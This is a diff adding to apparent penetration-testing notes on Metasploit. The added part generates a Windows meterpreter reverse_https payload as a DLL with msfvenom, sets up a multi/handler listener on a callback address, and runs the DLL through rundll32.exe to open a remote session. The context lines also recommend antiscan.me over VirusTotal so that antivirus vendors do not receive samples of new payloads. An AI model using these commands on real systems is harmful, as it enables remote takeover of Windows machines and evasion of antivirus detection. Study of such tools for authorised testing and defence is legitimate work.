@@ -24,3 +24,35 @@ msf6 > msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHO
 
 #### Verifying that your payload is detected by anvirus software or not, let's use virustotal:
 Note - virustotal send the scan results of new payloads to the respected companies of antivirus software so that they can update their software. So, we can't use it instead we are going to use **[https://antiscan.me/](https://antiscan.me/)
+
+**Note-2 - All of your encoders are placed inside kali linux machine in "/usr/share/metasploit-framework/modules/encoders/x86"
+
+## Generating payload with dll output format
+
+#### First, we will generate our payload using dll as the output format and set up our listener:
+```python
+┌──(root㉿kali)-[/home/hyok]
+└─# msfconsole -q                   
+[*] Starting persistent handler(s)...
+msf6 > msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.216.9 -f dll -o inject.dll
+```
+
+#### Setting up a listener
+```python
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_https
+PAYLOAD => windows/meterpreter/reverse_https
+msf6 exploit(multi/handler) > set LHOST 192.168.216.9
+LHOST => 192.168.216.9
+msf6 exploit(multi/handler) > run
+
+[*] Started HTTPS reverse handler on https://192.168.216.9:8443
+```
+
+#### Loading/Running DLL inside Windows
+![[MSFvenom_DLL_running_on_windows.jpeg]]
+- Unlike an executable, we need to use another application to load our DLL payload.
+- Above we use `rundll32.exe` to load the library and run our shellcode.
+- To load the DLL, use `rundll32.exe`, followed by the DLL we created, and the entry point name `main`.
+- After the above step you get a session in your handler running terminal
